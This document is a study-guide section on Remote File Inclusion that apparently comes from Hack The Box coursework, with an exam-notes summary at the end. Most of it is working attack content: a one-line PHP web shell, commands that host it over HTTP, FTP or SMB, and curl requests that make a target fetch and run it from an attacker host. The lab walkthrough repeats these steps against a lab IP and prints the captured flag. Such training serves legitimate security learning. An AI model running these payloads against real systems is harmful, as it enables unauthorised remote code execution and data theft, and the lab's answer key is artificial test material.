# Section 6 — Remote File Inclusion (RFI)

---

## LFI vs RFI

| | LFI | RFI |
|---|---|---|
| Source of included file | Local filesystem | URL (HTTP/FTP/SMB) |
| PHP setting required | None | `allow_url_include=On` |
| Outcome | Source disclosure, sometimes RCE via wrappers | Direct RCE — attacker hosts the payload |

Local File Inclusion (LFI) reads files from the server's own filesystem. Remote File Inclusion (RFI) fetches and executes a file from an attacker-controlled URL.

Every RFI is also an LFI. Not every LFI is RFI — three blockers:
1. The sink doesn't support remote URLs (e.g., `file_get_contents()` for read but `include` blocked)
2. The input is constrained (only filename portion is user-controlled)
3. `allow_url_include = Off` (the modern default — RFI is rare today)

Reference (Section 1 table):

| Function | Remote URL? |
|----------|:----------:|
| `include()`, `include_once()` (PHP) | ✅ |
| `file_get_contents()` (PHP) | ✅ (read-only) |
| `import` (Java/JSP) | ✅ |
| `@Html.RemotePartial()` (.NET) | ✅ (read-only) |
| `<!--#include file="..."-->` (.NET) | ✅ |

---

## Verify RFI

Always test with a **local** URL first to avoid firewall noise:

```bash
curl "http://TARGET/index.php?language=http://127.0.0.1:80/index.php"
```
> Confirms RFI by including the target's own page. If the page content appears twice in the response, the server fetched and rendered the remote URL — RFI is confirmed. Avoids exposing your attacker IP during testing.

If the included page renders inside the original response (e.g., the header section appears twice), RFI is confirmed.

> Avoid including the **same page** repeatedly — recursion DoS. Use a different local page (`info.php`, `login.php`) if available.

---

## RFI → RCE Workflow

### Step 1 — Make a PHP shell

```bash
mkdir /tmp/rfi_shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/rfi_shell/shell.php
```
> Creates a minimal PHP command-execution web shell that the target will fetch and run via RFI — change the `cmd` parameter name if you want a less obvious shell.

### Step 2 — Host it

#### Option A: HTTP (most reliable)
```bash
cd /tmp/rfi_shell
python3 -m http.server 8888 &
# Use port 80/443 if firewall blocks high ports; needs sudo for <1024
```
> Starts a simple HTTP server in the current directory on port 8888. The target server will fetch `shell.php` from this URL. Use a lower port if outbound high ports are firewalled (requires sudo for ports below 1024).

#### Option B: FTP (when HTTP filtered)
```bash
python3 -m pyftpdlib -p 21
# PHP authenticates anonymously by default; for creds: ftp://user:pass@HOST/shell.php
```
> Hosts the shell over FTP. Useful when outbound HTTP is blocked but FTP is not. PHP can authenticate anonymously by default.

#### Option C: SMB (Windows targets — no `allow_url_include` needed)
```bash
impacket-smbserver -smb2support share /tmp/rfi_shell
# Include via UNC: \\ATTACKER_IP\share\shell.php
```
> Hosts the shell over SMB using Impacket. On Windows, PHP can include files via UNC paths (`\\IP\share\file`) without needing `allow_url_include`. Useful when other methods are blocked.

### Step 3 — Trigger inclusion

```bash
curl -sk "http://TARGET/index.php?language=http://ATTACKER_IP:8888/shell.php&cmd=id"
# → uid=33(www-data) gid=33(www-data)

# Or with cleaner URL encoding for complex commands:
curl -sk -G "http://TARGET/index.php" \
  --data-urlencode "language=http://ATTACKER_IP:8888/shell.php" \
  --data-urlencode "cmd=cat /etc/passwd"
```
> Triggers the RFI by setting `language` to the attacker-hosted shell URL. Appending `&cmd=id` runs the `id` command via the web shell. Use `-G --data-urlencode` for commands with spaces or special characters to avoid manual encoding.

### Step 4 — Confirm payload was fetched

Watch the Python listener log:
```
10.129.X.X - - [...] "GET /shell.php HTTP/1.0" 200 -
```

If you see the GET but the page returns empty content, the file is being read but maybe not executed. Check the URL — some apps append `.php`, making `/shell.php.php` — host as `shell.php` matches.

---

## Why Use Different Protocols

| Protocol | When |
|----------|------|
| `http://` / `https://` | Default — usually works, easy to set up |
| `ftp://` | Outbound HTTP blocked; FTP often allowed |
| `\\ATTACKER\share\` (SMB) | Windows target — bypasses `allow_url_include` entirely |

---

## Lab — RFI + Flag Hunt

**Target:** `10.129.29.114` (HTB VPN)

### Step 1 — Confirm RFI

```bash
curl -sk "http://10.129.29.114/index.php?language=http://127.0.0.1/index.php"
# → History/Containers content appears twice = RFI confirmed
```

### Step 2 — Host shell + trigger

```bash
mkdir /tmp/rfi_shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/rfi_shell/shell.php
cd /tmp/rfi_shell && python3 -m http.server 8888 &

curl -sk "http://10.129.29.114/index.php?language=http://10.10.17.176:8888/shell.php&cmd=id"
# → uid=33(www-data) gid=33(www-data)
```

### Step 3 — Locate flag

```bash
# ls / reveals a non-standard /exercise directory
curl -sk -G "http://10.129.29.114/index.php" \
  --data-urlencode "language=http://10.10.17.176:8888/shell.php" \
  --data-urlencode "cmd=ls /"
# → exercise (alongside bin, etc, home, ...)

curl -sk -G "http://10.129.29.114/index.php" \
  --data-urlencode "language=http://10.10.17.176:8888/shell.php" \
  --data-urlencode "cmd=ls -la /exercise"
# → -rw-r--r-- 1 root root 33 flag.txt
```

### Step 4 — Read flag

```bash
curl -sk -G "http://10.129.29.114/index.php" \
  --data-urlencode "language=http://10.10.17.176:8888/shell.php" \
  --data-urlencode "cmd=cat /exercise/flag.txt"
```

**Flag:** `99a8fc05f033f2fc0cf9a6f9826f83f4`

> Use `-G --data-urlencode` instead of inline `?cmd=...` for any command with spaces or special chars — much more reliable than manual URL encoding.

---

## Exam Notes

- Always start with the local URL test (`http://127.0.0.1`) — if that works, RFI is confirmed without exposing your attacker IP
- `python3 -m http.server` on a Linux attack host is the fastest payload hosting method
- For Windows targets, SMB via `impacket-smbserver` bypasses `allow_url_include` entirely — important when the setting is off
- Don't include the same vulnerable page — recursive inclusion = DoS
- `curl -G --data-urlencode` for complex commands; saves you from manual `%20` / `%26` encoding mistakes
- Stop the Python listener when done (clutter + open port). `TaskStop` or `kill %1`
- The flag location pattern in HTB labs: `/exercise/flag.txt`, `/usr/share/flags/flag.txt`, `/flag.txt`, `/root/flag.txt`. Check all four when blind hunting.
